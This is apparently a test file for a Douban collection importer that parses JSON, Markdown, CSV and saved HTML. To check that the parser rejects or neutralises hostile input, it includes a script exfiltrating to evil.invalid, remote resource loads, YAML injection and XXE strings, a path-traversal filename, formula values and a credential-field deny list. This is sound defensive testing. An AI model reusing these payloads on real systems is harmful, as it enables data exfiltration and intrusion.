import assert from 'node:assert/strict';
import { runInNewContext } from 'node:vm';
import test from 'node:test';
import { parseHTML } from 'linkedom/worker';
import { parseDoubanImportFiles, renderDoubanImportParserScript, DoubanImportError, DOUBAN_IMPORT_LIMITS } from './douban-import.ts';

const options = { profileId: 'synthetic-owner' };
const base = { title: '自己的电影', url: 'https://movie.douban.com/subject/1234567/', type: 'movie', state: '看过', myRating: 4,
  collectionDate: '2026-11-12', myComment: '只有本人保存的短评' };
const json = (items: unknown, name = 'my-export.json') => ({ name, text: JSON.stringify(items) });
function browserParse(files: unknown, settings: unknown = options) {
  const { document } = parseHTML('<!doctype html><html><body></body></html>');
  const context = { window: {}, document, TextEncoder, URL, input: JSON.stringify(files), settings: JSON.stringify(settings) };
  const source = renderDoubanImportParserScript().replace(/^<script>/, '').replace(/<\/script>$/, '');
  runInNewContext(source + ';window.result=window.JiashuDoubanImport.parse(JSON.parse(input),JSON.parse(settings));', context);
  return JSON.parse(JSON.stringify((context.window as unknown as { result: unknown }).result));
}
function invalid(operation: () => unknown, pattern?: RegExp) {
  assert.throws(operation, (error: unknown) => {
    assert.ok(error instanceof DoubanImportError);
    assert.equal(error.code, 'INVALID_DOUBAN_IMPORT');
    if (pattern) assert.match(error.message, pattern);
    return true;
  });
}

test('JSON maps only completed personal fields across all four kinds and never uploads unrelated private metadata', () => {
  const rows = [base,
    { ...base, title: '自己的电视剧', url: 'https://movie.douban.com/subject/2345678/', type: 'series' },
    { ...base, title: '自己的书', url: 'https://book.douban.com/subject/3456789/', type: 'book', state: '读过' },
    { ...base, title: '自己的音乐', url: 'https://music.douban.com/subject/4567890/', type: 'music', state: '听过', unrelatedPrivateData: 'PRIVATE-DO-NOT-UPLOAD' }];
  const result = parseDoubanImportFiles([json(rows)], options);
  assert.deepEqual(result.items.map(item => item.kind), ['movie', 'series', 'book', 'music']);
  assert.ok(result.items.every(item => item.source === 'import' && item.rating === 4 && item.markedDate === '2026-11-12'));
  assert.equal(result.items[0].comment, base.myComment);
  assert.equal(result.sourceFiles, 1); assert.equal(result.skipped, 0);
  assert.doesNotMatch(JSON.stringify(result), /PRIVATE-DO-NOT-UPLOAD|unrelatedPrivateData/);
  assert.deepEqual(browserParse([json(rows)]), result);
});

test('a missing completion state requires explicit confirmation but wish, doing and unknown states stay skipped', () => {
  const rows = [{ ...base, state: undefined }, { ...base, state: '想看' }, { ...base, state: '在看' }, { ...base, state: '未识别状态' }];
  const preview = parseDoubanImportFiles([json(rows)], options);
  assert.equal(preview.items.length, 0); assert.equal(preview.skipped, 4); assert.ok(preview.warnings.length);
  const confirmed = parseDoubanImportFiles([json(rows)], { ...options, confirmCompleted: true });
  assert.equal(confirmed.items.length, 1); assert.equal(confirmed.skipped, 3);
  assert.match(confirmed.warnings.join(' '), /确认/);
  const wrongDomain = parseDoubanImportFiles([json([{ ...base, type: 'book', url: 'https://book.douban.com/subject/1234567/', state: '看过' }])], { ...options, confirmCompleted: true });
  assert.equal(wrongDomain.items.length, 0);
});

test('site scores cannot masquerade as personal stars and canonical templates distinguish their rating field', () => {
  const result = parseDoubanImportFiles([json([{ ...base, myRating: null, rating: 4, score: 8.8, datePublished: '2000-01-01', collectionDate: null }])], options);
  assert.equal(result.items[0].rating, null); assert.equal(result.items[0].markedDate, null);
  assert.match(result.warnings.join(' '), /站点评分/);
  const envelope = { format: 'jiashu-douban-import-v1', profileId: options.profileId, items: [{ ...base, myRating: undefined, rating: 5 }] };
  assert.equal(parseDoubanImportFiles([json(envelope)], options).items[0].rating, 5);
  for (const rating of [0, 6, 4.5, '8.8', '=1+4']) invalid(() => parseDoubanImportFiles([json([{ ...base, myRating: rating }])], options), /评分/);
});

test('safe Obsidian Markdown compatibility reads personal state, date and body comment without evaluating YAML', () => {
  const markdown = [
    '---', 'doubanId: 1234567', 'title: "自己的电影：一"', 'type: 电影', 'score: 8.8', 'myRating: 4', 'state: 看过',
    'url: https://movie.douban.com/subject/1234567/', 'collectionDate: 2026-11-12', 'datePublished: 2020-01-01',
    'actor: [某位演员]', 'desc: |', '  这个摘要不作为个人短评导入。', '---', '', '![image](<{{image}}>)', '',
    'Comment:', '---', '自己的第一行短评', '第二行短评', '', '---', 'Menu:', '不是短评',
  ].join('\n');
  const result = parseDoubanImportFiles([{ name: '自己的电影.md', text: markdown }], options);
  assert.equal(result.items[0].title, '自己的电影：一');
  assert.equal(result.items[0].rating, 4); assert.equal(result.items[0].markedDate, '2026-11-12');
  assert.equal(result.items[0].coverUrl, null); assert.equal(result.items[0].comment, '自己的第一行短评\n第二行短评');
  assert.deepEqual(browserParse([{ name: '自己的电影.md', text: markdown }]), result);
  for (const value of ['!!js/function >', '&anchor secret', '*anchor']) {
    invalid(() => parseDoubanImportFiles([{ name: 'bad.md', text: '---\ntitle: ' + value + '\nurl: https://movie.douban.com/subject/1234567/\nstate: 看过\n---' }], options), /YAML/);
  }
  invalid(() => parseDoubanImportFiles([{ name: 'bad.md', text: '---\ntitle: 一\ntitle: 二\n---' }], options), /重复/);
});

test('UTF-8 CSV handles BOM, quoted commas, escaped quotes and multiline comments as inert text', () => {
  const csv = '\uFEFFtitle,url,type,state,myRating,myCollectionDate,myComment\r\n'
    + '"自己的,电影",https://movie.douban.com/subject/1234567/,movie,看过,4,2026-11-12,"第一行\r\n第二行""引号"""\r\n';
  const result = parseDoubanImportFiles([{ name: 'mine.csv', text: csv }], options);
  assert.equal(result.items[0].title, '自己的,电影');
  assert.equal(result.items[0].comment, '第一行\r\n第二行"引号"');
  assert.deepEqual(browserParse([{ name: 'mine.csv', text: csv }]), result);
  const formula = parseDoubanImportFiles([{ name: 'literal.csv', text: 'title,url,state\n=1+1,https://movie.douban.com/subject/1234567/,看过' }], options);
  assert.equal(formula.items[0].title, '=1+1');
  for (const text of ['title,url,state\n"unclosed', 'title,url,state\n"x"oops,url,看过', 'title,title\nx,y', 'title,url,state\nx,url']) {
    invalid(() => parseDoubanImportFiles([{ name: 'bad.csv', text }], options), /CSV/);
  }
});

function savedPage(extra = '') {
  return '<!DOCTYPE html><html><head><title>本人看过的电影(8)</title><link rel="canonical" href="https://movie.douban.com/people/synthetic-owner/collect"></head><body>'
    + '<h1>本人看过的电影(8)</h1><div class="grid-view"><div class="item"><div class="info"><ul><li class="title"><a href="https://movie.douban.com/subject/1234567/"><em>本人私密电影</em></a></li>'
    + '<li><span class="rating4-t"></span><span class="date">2026-11-12</span></li><li class="comment">本人自己的短评</li></ul></div></div></div>'
    + extra + '</body></html>';
}
test('saved private collection HTML is detached, never executes scripts, and exports only completed item fields', (context) => {
  let fetches = 0; context.mock.method(globalThis, 'fetch', async () => { fetches++; throw new Error('No network allowed'); });
  const text = savedPage('<script>fetch("https://evil.invalid/EXFILTRATE");globalThis.PRIVATE_EXECUTED=true;</script><input name="ck" value="PRIVATE-TOKEN-NOT-IMPORTED">'
    + '<img src="https://evil.invalid/img"><iframe src="https://evil.invalid/frame" srcdoc="&lt;img src=https://evil.invalid/nested&gt;"></iframe>'
    + '<link rel="stylesheet" href="https://evil.invalid/style.css"><style>body{background:url(https://evil.invalid/css)}</style>');
  const result = parseDoubanImportFiles([{ name: 'private.html', text, domain: 'screen' }], options);
  assert.equal(fetches, 0);
  assert.equal(result.items[0].title, '本人私密电影'); assert.equal(result.items[0].kind, 'screen');
  assert.equal(result.items[0].rating, 4); assert.equal(result.items[0].markedDate, '2026-11-12');
  assert.equal(result.items[0].source, 'import'); assert.match(result.warnings.join(' '), /一个收藏页面/);
  assert.doesNotMatch(JSON.stringify(result), /EXFILTRATE|PRIVATE-TOKEN|PRIVATE_EXECUTED/);
  assert.deepEqual(browserParse([{ name: 'private.html', text }]), result);
  assert.doesNotMatch(renderDoubanImportParserScript(), /new DOMParser|window\.DOMParser/);
  assert.match(renderDoubanImportParserScript(), /createElement\("template"\)/);
  invalid(() => parseDoubanImportFiles([{ name: 'other.html', text: text.replace('/people/synthetic-owner/', '/people/someone-else/') }], options), /来源主页/);
  invalid(() => parseDoubanImportFiles([{ name: 'wish.html', text: text.replaceAll('看过的电影', '想看的电影') }], { ...options, confirmCompleted: true }), /收藏列表/);
  invalid(() => parseDoubanImportFiles([{ name: 'verify.html', text: '<h1>安全验证</h1>' }], options), /验证/);
  invalid(() => parseDoubanImportFiles([{ name: 'bad.html', text: '<!DOCTYPE html [<!ENTITY x SYSTEM "file:///secret">]>' + text }], options), /文档声明/);
});

test('credential fields and wrong-profile input fail locally without exposing their contents', () => {
  for (const field of ['cookie', 'password', 'Authorization', 'access_token', 'sessionToken', 'dbcl2']) {
    invalid(() => parseDoubanImportFiles([json([{ ...base, [field]: 'SECRET-CREDENTIAL' }])], options), /凭据/);
    invalid(() => parseDoubanImportFiles([{ name: 'bad.md', text: '---\n' + field + ': SECRET-CREDENTIAL\n---' }], options), /凭据/);
    invalid(() => parseDoubanImportFiles([{ name: 'bad.csv', text: 'title,url,state,' + field + '\nx,https://movie.douban.com/subject/1234567/,看过,SECRET-CREDENTIAL' }], options), /凭据/);
  }
  invalid(() => parseDoubanImportFiles([json([{ ...base, profileId: 'another-owner' }])], options), /主页/);
  invalid(() => parseDoubanImportFiles([json([base])], { profileId: 'https://evil.invalid/' }), /主页 ID/);
  invalid(() => parseDoubanImportFiles([json([{ ...base, url: 'https://evil.invalid/subject/1234567/' }])], options), /豆瓣/);
});

test('identical duplicates merge but conflicting copies fail the entire preview rather than choosing one silently', () => {
  const files = [json([base]), json([base], 'copy.json')];
  const result = parseDoubanImportFiles(files, options);
  assert.equal(result.items.length, 1); assert.equal(result.duplicates, 1); assert.equal(result.sourceFiles, 2);
  invalid(() => parseDoubanImportFiles([json([base]), json([{ ...base, myRating: 5 }], 'different.json')], options), /不同内容/);
  invalid(() => parseDoubanImportFiles([json([base, { ...base, url: 'https://evil.invalid/' }])], options));
});

test('preview size, row, filename and field bounds remain explicit before any write', () => {
  invalid(() => parseDoubanImportFiles([], options), /1–100/);
  invalid(() => parseDoubanImportFiles(Array.from({ length: 101 }, () => json([])), options), /1–100/);
  invalid(() => parseDoubanImportFiles([{ name: '../unsafe.json', text: '[]' }], options), /描述/);
  invalid(() => parseDoubanImportFiles([{ name: 'x.js', text: '[]' }], options), /只支持/);
  invalid(() => parseDoubanImportFiles([{ name: 'too-big.json', text: ' '.repeat(DOUBAN_IMPORT_LIMITS.bytes + 1) }], options), /8 MiB/);
  invalid(() => parseDoubanImportFiles([{ name: 'too-big.html', text: ' '.repeat(DOUBAN_IMPORT_LIMITS.htmlBytes + 1) }], options), /HTML 页面过大/);
  invalid(() => parseDoubanImportFiles([json(Array.from({ length: 501 }, () => base))], options), /500/);
  invalid(() => parseDoubanImportFiles([json([{ ...base, myComment: '字'.repeat(2001) }])], options), /短评/);
  invalid(() => parseDoubanImportFiles([json([{ ...base, collectionDate: '2026-02-30' }])], options), /有效日期/);
});
